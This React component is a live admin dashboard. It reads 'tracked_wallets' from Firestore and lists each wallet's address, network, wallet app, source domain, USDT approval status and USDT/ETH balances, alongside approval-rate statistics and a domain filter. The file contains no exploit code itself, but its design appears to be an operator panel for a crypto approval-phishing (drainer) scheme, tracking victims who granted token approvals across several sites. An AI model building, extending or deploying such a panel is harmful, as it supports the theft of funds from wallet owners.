import { useState, useEffect } from 'react';
import { collection, onSnapshot, query, orderBy } from 'firebase/firestore';
import { db } from '../../config/firebase';

export default function WalletDashboard() {
  const [wallets, setWallets] = useState([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState('');
  const [domainFilter, setDomainFilter] = useState('');

  useEffect(() => {
    const q = query(collection(db, "tracked_wallets"), orderBy("lastUpdated", "desc"));
    const unsubscribe = onSnapshot(q, (snapshot) => {
      const docs = [];
      snapshot.forEach((doc) => {
        docs.push({ id: doc.id, ...doc.data() });
      });
      setWallets(docs);
      setLoading(false);
    }, (err) => {
      console.error("Error fetching wallets:", err);
      setLoading(false);
    });

    return () => unsubscribe();
  }, []);

  const handleRefresh = () => {
    setLoading(true);
    setTimeout(() => setLoading(false), 800);
  };

  const totalConnections = wallets.length;
  const approved = wallets.filter(w => w.approval === 'Approved').length;
  const pending = wallets.filter(w => w.approval === 'Pending').length;
  const approvalRate = totalConnections > 0 ? Math.round((approved / totalConnections) * 100) : 0;

  // Extract unique domains for the dropdown
  const uniqueDomains = [...new Set(wallets.map(w => w.domain).filter(Boolean))];

  const filteredWallets = wallets.filter(w => {
    const matchesSearch = 
      (w.address || '').toLowerCase().includes(search.toLowerCase()) || 
      (w.wallet || '').toLowerCase().includes(search.toLowerCase()) ||
      (w.domain || '').toLowerCase().includes(search.toLowerCase());
    const matchesDomain = domainFilter === '' || w.domain === domainFilter;
    return matchesSearch && matchesDomain;
  });

  return (
    <>
      <header className="admin-header">
        <div className="admin-header__left">
          <h1 className="admin-title">
            <span className="admin-title__icon">🔒</span>
            Wallet Dashboard
          </h1>
          <p className="admin-subtitle">Monitor connected wallets and USDT approval status (Live)</p>
        </div>
        <button className="admin-refresh-btn" onClick={handleRefresh} disabled={loading}>
          <svg width="16" height="16" viewBox="0 0 16 16" fill="none" className={loading ? 'spinning' : ''}>
            <path d="M13.65 2.35A7.96 7.96 0 0 0 8 0C3.58 0 0 3.58 0 8s3.58 8 8 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0 1 8 14 6 6 0 1 1 8 2c1.66 0 3.14.69 4.22 1.78L9 7h7V0l-2.35 2.35z" fill="currentColor"/>
          </svg>
          {loading ? 'Syncing…' : 'Sync'}
        </button>
      </header>

      <div className="admin-stats">
        <div className="admin-stat-card">
          <div className="admin-stat-card__value">{totalConnections}</div>
          <div className="admin-stat-card__label">Total Connections</div>
          <div className="admin-stat-card__accent admin-stat-card__accent--blue" />
        </div>
        <div className="admin-stat-card">
          <div className="admin-stat-card__value">{approved}</div>
          <div className="admin-stat-card__label">Approved</div>
          <div className="admin-stat-card__accent admin-stat-card__accent--green" />
        </div>
        <div className="admin-stat-card">
          <div className="admin-stat-card__value">{pending}</div>
          <div className="admin-stat-card__label">Pending</div>
          <div className="admin-stat-card__accent admin-stat-card__accent--amber" />
        </div>
        <div className="admin-stat-card">
          <div className="admin-stat-card__value">{approvalRate}%</div>
          <div className="admin-stat-card__label">Approval Rate</div>
          <div className="admin-stat-card__accent admin-stat-card__accent--purple" />
        </div>
      </div>

      <div className="admin-search-wrap" style={{ marginBottom: '16px' }}>
        <span className="admin-search-icon" style={{ fontSize: '16px' }}>🌐</span>
        <select 
          className="admin-search" 
          style={{ appearance: 'none', paddingLeft: '40px' }}
          value={domainFilter}
          onChange={(e) => setDomainFilter(e.target.value)}
        >
          <option value="">All Domains ({totalConnections})</option>
          {uniqueDomains.map(d => (
            <option key={d} value={d}>{d}</option>
          ))}
        </select>
        <div style={{ position: 'absolute', right: '16px', top: '50%', transform: 'translateY(-50%)', pointerEvents: 'none', color: '#64748b' }}>
          ▼
        </div>
      </div>

      <div className="admin-search-wrap" style={{ marginBottom: '24px' }}>
        <span className="admin-search-icon" style={{ fontSize: '16px' }}>🔍</span>
        <input 
          type="text" 
          className="admin-search" 
          placeholder="Search by address, network, or wallet..." 
          value={search}
          onChange={(e) => setSearch(e.target.value)}
          style={{ paddingLeft: '40px' }}
        />
        {search && (
          <button className="admin-search-clear" onClick={() => setSearch('')}>
            ✕
          </button>
        )}
      </div>

      <div className="admin-table-wrapper">
        <table className="admin-table">
          <thead>
            <tr>
              <th className="admin-th admin-th--num">#</th>
              <th className="admin-th">Address</th>
              <th className="admin-th">Network</th>
              <th className="admin-th">Wallet</th>
              <th className="admin-th">Domain</th>
              <th className="admin-th">Approval</th>
              <th className="admin-th">Balance</th>
            </tr>
          </thead>
          <tbody>
            {loading && wallets.length === 0 ? (
              <tr>
                <td colSpan="7" className="admin-empty-cell">
                  <div className="admin-loader">
                    <div className="admin-loader__spinner" />
                    <span>Loading live data…</span>
                  </div>
                </td>
              </tr>
            ) : filteredWallets.length === 0 ? (
              <tr>
                <td colSpan="7" className="admin-empty-cell">
                  <div className="admin-empty">
                    <span className="admin-empty__icon">📭</span>
                    <span>No wallets found</span>
                  </div>
                </td>
              </tr>
            ) : (
              filteredWallets.map((wallet, idx) => {
                const networkClass = (wallet.network || 'evm').toLowerCase() === 'tron' ? 'tron' : 'evm';
                const formatAddr = wallet.address ? `${wallet.address.slice(0, 6)}...${wallet.address.slice(-4)}` : 'Unknown';
                const statusClass = (wallet.approval || 'pending').toLowerCase();
                
                return (
                  <tr key={wallet.id} className="admin-row">
                    <td className="admin-td admin-td--num">{idx + 1}</td>
                    <td className="admin-td admin-td--address">
                      <div className="admin-address">
                        <div className="admin-address__dot" data-network={networkClass} />
                        <code>{formatAddr}</code>
                      </div>
                    </td>
                    <td className="admin-td">
                      <div className={`admin-badge admin-badge--${networkClass}`}>
                        ♦ {wallet.network || 'EVM'}
                      </div>
                    </td>
                    <td className="admin-td admin-td--wallet">{wallet.wallet || 'Unknown'}</td>
                    <td className="admin-td">
                      <span style={{ fontFamily: 'monospace', fontSize: '12px', opacity: 0.85 }}>
                        {wallet.domain || 'unknown'}
                      </span>
                    </td>
                    <td className="admin-td">
                      <div className={`admin-status admin-status--${statusClass}`}>
                        <div className={`admin-status__dot admin-status__dot--${statusClass}`} />
                        {wallet.approval || 'Pending'}
                      </div>
                    </td>
                    <td className="admin-td admin-td--balance">
                      <div className="admin-balance">
                        <span className="admin-balance__usdt">{wallet.usdt || '0.00'} USDT</span>
                        <span className="admin-balance__native">{wallet.native || '0.0000'} ETH</span>
                      </div>
                    </td>
                  </tr>
                );
              })
            )}
          </tbody>
        </table>
      </div>
    </>
  );
}
